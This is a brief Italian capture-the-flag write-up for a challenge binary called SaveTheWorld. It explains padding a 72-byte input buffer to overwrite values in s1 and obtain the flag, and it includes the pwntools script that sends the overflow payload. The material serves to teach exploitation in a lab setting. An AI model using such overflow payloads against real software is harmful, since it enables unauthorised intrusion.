ho visto che i byte disponibili nella variabile che avvrebbe preso il mio inpit erano 72, quindi ho sato quelli per il garbage e inserito i valori necessari a sostituire quelli in s1 e ottere 1 come return, portando al risultato della flag:
```SPRITZ{Yare_Yare}```

lascio il codice python utilizzato:

```
from pwn import * 

msg = b"a"*(72) +b"Jotaro!!"+b"Star Platinum!!!"+b"HORA"+b"9999" 
p = process('./SaveTheWorld') 
p.sendline(msg) 
msgout = p.recvall() 
print('output:\t', msgout) 
```